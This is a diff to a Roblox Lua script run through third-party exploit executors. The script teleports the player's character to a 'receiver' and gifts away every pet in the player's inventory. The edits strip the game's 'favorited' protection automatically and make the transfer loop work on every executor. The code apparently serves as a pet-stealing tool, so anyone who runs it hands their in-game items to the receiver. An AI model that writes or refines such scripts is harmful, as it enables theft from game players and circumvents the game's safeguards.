@@ -463,13 +463,26 @@ local function isPetFavorited(petName)
     local pet = LocalPlayer.Backpack:FindFirstChild(petName)
     if not pet then return false end
     
+    -- Check for favorite icon in descendants
     for _, descendant in ipairs(pet:GetDescendants()) do
         if descendant:IsA("ImageLabel") and descendant.Name == "FavoriteIcon" then
             return true
         end
     end
     
-    return pet:GetAttribute("Favorited") or false
+    -- Check for favorite attribute
+    if pet:GetAttribute("Favorited") then
+        return true
+    end
+    
+    -- Check for favorite notification
+    for _, gui in ipairs(CoreGui:GetDescendants()) do
+        if gui:IsA("TextLabel") and gui.Text:lower():find("cannot gift a favorited pet") then
+            return true
+        end
+    end
+    
+    return false
 end
 
 local function unfavoritePet(petName)
@@ -477,6 +490,7 @@ local function unfavoritePet(petName)
     if pet then
         if isPetFavorited(petName) then
             ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+            task.wait(0.5)
             return true
         end
     end
@@ -491,6 +505,7 @@ local function equipSinglePet(petName)
     local character = LocalPlayer.Character
     if not character then return false end
 
+    -- Unequip all pets first
     for _, item in ipairs(character:GetChildren()) do
         if item.Name:match(" %[%d+%.%d+ KG%] %[Age %d+%]$") then
             item.Parent = LocalPlayer.Backpack
@@ -500,6 +515,7 @@ local function equipSinglePet(petName)
     local pet = LocalPlayer.Backpack:FindFirstChild(petName)
     if pet then
         pet.Parent = character
+        task.wait(0.5) -- Wait for pet to equip
         return true
     end
     return false
@@ -519,7 +535,7 @@ local function teleportToPlayer(targetPlayer)
     
     if LocalPlayer.Character:FindFirstChildOfClass('Humanoid') and LocalPlayer.Character:FindFirstChildOfClass('Humanoid').SeatPart then
         LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit = false
-        wait(.1)
+        task.wait(0.1)
     end
     
     root.CFrame = targetRoot.CFrame + Vector3.new(3,1,0)
@@ -709,56 +725,41 @@ local function startGifting(targetPlayer)
         end
 
         for _, pet in ipairs(pets) do
-            if IS_DELTA then
-                if equipSinglePet(pet.fullName) then
-                    local attempts = 0
-                    local success = false
+            -- Always use Delta-style gifting for all executors
+            if equipSinglePet(pet.fullName) then
+                local attempts = 0
+                local success = false
+                
+                while attempts < 3 and not success do
+                    attempts = attempts + 1
                     
-                    while attempts < 3 and not success do
-                        attempts = attempts + 1
+                    teleportToPlayer(targetPlayer)
+                    
+                    if clickPlayerScreen(targetPlayer) then
+                        task.wait(0.5)
+                        local promptStatus = checkForGiftPrompt(targetPlayer)
                         
-                        teleportToPlayer(targetPlayer)
-                        
-                        if clickPlayerScreen(targetPlayer) then
-                            task.wait(0.5)
-                            local promptStatus = checkForGiftPrompt(targetPlayer)
-                            
-                            if promptStatus == "gift" then
-                                giftPet(targetPlayer, pet.fullName)
-                                while LocalPlayer.Backpack:FindFirstChild(pet.fullName) or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(pet.fullName)) do
-                                    task.wait(0.5)
-                                end
-                                success = true
-                                task.wait(GIFT_COOLDOWN)
-                            elseif promptStatus == "favorited" then
-                                if unfavoritePet(pet.fullName) then
-                                    task.wait(1)
-                                    equipSinglePet(pet.fullName)
-                                end
-                            else
+                        if promptStatus == "gift" then
+                            giftPet(targetPlayer, pet.fullName)
+                            while LocalPlayer.Backpack:FindFirstChild(pet.fullName) or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(pet.fullName)) do
+                                task.wait(0.5)
+                            end
+                            success = true
+                            task.wait(GIFT_COOLDOWN)
+                        elseif promptStatus == "favorited" then
+                            if unfavoritePet(pet.fullName) then
                                 task.wait(1)
+                                equipSinglePet(pet.fullName)
                             end
                         else
                             task.wait(1)
                         end
+                    else
+                        task.wait(1)
                     end
-                    
-                    if success then break end
                 end
-            else
-                if isPetFavorited(pet.fullName) then
-                    unfavoritePet(pet.fullName)
-                    task.wait(1)
-                end
-
-                if equipSinglePet(pet.fullName) then
-                    giftPet(targetPlayer, pet.fullName)
-                    while LocalPlayer.Backpack:FindFirstChild(pet.fullName) or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(pet.fullName)) do
-                        task.wait(0.5)
-                    end
-                    task.wait(GIFT_COOLDOWN)
-                    break
-                end
+                
+                if success then break end
             end
         end
         task.wait(1)
@@ -774,6 +775,3 @@ if not receiver then return end
 
 teleportToPlayer(receiver)
 startGifting(receiver)
-
-
---- to check if its favorited look for this on screen; Notification_upvr:CreateNotification("You can only place your pets in your garden!") also it didnt even try to equip the one thats favorited and it kicked me saying all pets gifted.
